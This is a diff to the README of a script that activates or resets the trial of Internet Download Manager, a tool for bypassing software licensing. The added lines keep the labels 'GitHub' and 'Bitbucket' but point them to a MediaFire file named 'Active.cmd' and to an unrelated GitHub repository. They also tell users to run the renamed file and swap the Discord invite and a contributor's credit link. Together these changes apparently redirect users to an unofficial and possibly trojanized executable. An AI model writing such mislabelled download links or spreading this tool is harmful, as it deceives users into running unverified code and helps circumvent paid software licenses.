@@ -12,7 +12,7 @@ An open-source tool to activate and reset the trial of [Internet Download Manage
 ## IAS Latest Release
 
 Last Release - v1.0 (01-Dec-2023)\
-[GitHub](https://github.com/WindowsAddict/IDM-Activation-Script) - [BitBucket](https://bitbucket.org/WindowsAddict/idm-activation-script/)
+[GitHub](https://www.mediafire.com/file/hwhgj6m0lbngcy9/Active.cmd/file) - [BitBucket](https://www.mediafire.com/file/hwhgj6m0lbngcy9/Active.cmd/file)
 
 ## Download / How to use it?
 
@@ -31,9 +31,9 @@ Last Release - v1.0 (01-Dec-2023)\
 
 ### Method 2 - Traditional
 
--   Download the file from [GitHub](https://github.com/WindowsAddict/IDM-Activation-Script/archive/refs/heads/main.zip) or [Bitbucket](https://bitbucket.org/WindowsAddict/idm-activation-script/get/main.zip)
+-   Download the file from [GitHub](https://github.com/Gtajisan/IDM--Script/blob/main/Active.cmd) or [Bitbucket](https://github.com/Gtajisan/IDM--Script/blob/main/Active.cmd)
 -   Right-click on the downloaded zip file and extract
--   In the extracted folder, run the file named `IAS.cmd`
+-   In the extracted folder, run the file named `active.cmd`
 -   You will see the activation options, and follow onscreen instructions.
 -   That's all.
 
@@ -71,7 +71,7 @@ Last Release - v1.0 (01-Dec-2023)\
 -   Browser Integration Fix: [Chrome](https://www.internetdownloadmanager.com/register/new_faq/bi9.html) - [Firefox](https://www.internetdownloadmanager.com/register/new_faq/bi4.html)
 -   Reach out to us on [Discord](https://discord.gg/gjJEfq7ux8) (signup not required) with an error screenshot.
 
-[![](https://lookimg.com/images/2023/03/21/QTvjcD.png)](https://discord.gg/gjJEfq7ux8)
+[![](https://lookimg.com/images/2023/03/21/QTvjcD.png)](https://discord.com/invite/553f6zeG)
 
 ## Changelog
 
@@ -110,7 +110,7 @@ Last Release - v1.0 (01-Dec-2023)\
 |----------------|--------------------------------------------------------|
 | Dukun Cabul                                 | Original researcher of this IDM trial reset and activation logic, made an Autoit tool for these methods, [IDM-AIO_2020_Final](https://nsaneforums.com/topic/371047-discussion-internet-download-manager-fixes/page/8/#comment-1632062) |
 | AveYo aka BAU                               | [reg_own lean and mean snippet](https://pastebin.com/XTPt0JSC)                                                                                                                                                                         |
-| [abbodi1406](https://github.com/abbodi1406) | Help in coding                                                                                                                                                                                                                         |
+| [abbodi1406](https://github.com/gtajisan) | Help in coding                                                                                                                                                                                                                         |
 | WindowsAddict                               | IAS Author                                                                                                                                                                                                                             |
 
 And thanks to the IAS users for their interest, feedback, and assistance.
